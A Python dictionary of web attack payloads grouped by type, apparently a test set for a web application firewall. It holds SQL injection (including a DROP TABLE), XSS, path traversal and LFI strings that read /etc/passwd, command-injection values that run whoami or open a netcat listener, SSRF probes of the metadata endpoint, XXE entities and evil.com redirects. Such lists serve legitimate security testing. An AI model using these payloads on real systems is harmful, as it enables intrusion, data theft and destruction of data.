PAYLOADS = {
    "SQL Injection": [
        "' OR '1'='1",
        "1; DROP TABLE notablewaftest17 --",
        "admin' --",
        "' OR 1=1--",
        "' OR 'a'='a",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR SLEEP(5)--",
        "' OR 1=1 LIMIT 1;--"
    ],
    "XSS": [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<svg/onload=alert('xss')>",
        "<body onload=alert('xss')>",
        "<a href=javascript:alert('xss')>click</a>",
        "<math href=javascript:alert(1)>"
    ],
    "Path Traversal": [
        "../../etc/passwd",
        "../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ],
    "Command Injection": [
        "$(cat /etc/passwd)",
        "| cat /etc/passwd",
        "; ls -la",
        "& whoami",
        "| id",
        "; ping -c 10 127.0.0.1",
        "| nc -lvp 4444"
    ],
    "SSRF": [
        "http://127.0.0.1/",
        "file:///etc/passwd",
        "http://127.0.0.1/latest/meta-data/",
        "http://localhost:80/",
        "http://0.0.0.0:80/",
        "http://[::1]/",
        "http://example.com@127.0.0.1/"
    ],
    "NoSQL Injection": [
        "{'$gt':''}",
        '{"$ne":null}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$where": "this.password == this.passwordConfirm"}',
        '{"$or": [{}, {}]}'
    ],
    "Local File Inclusion": [
        "php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd",
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "/proc/self/environ"
    ],
    "XML External Entity (XXE)": [
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
        "<!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/passwd'>]><data>&file;</data>"
    ],
    "Open Redirect": [
        "//evil.com",
        "http://evil.com",
        "/\\evil.com",
        "//google.com%2F%2Fevil.com"
    ]
}
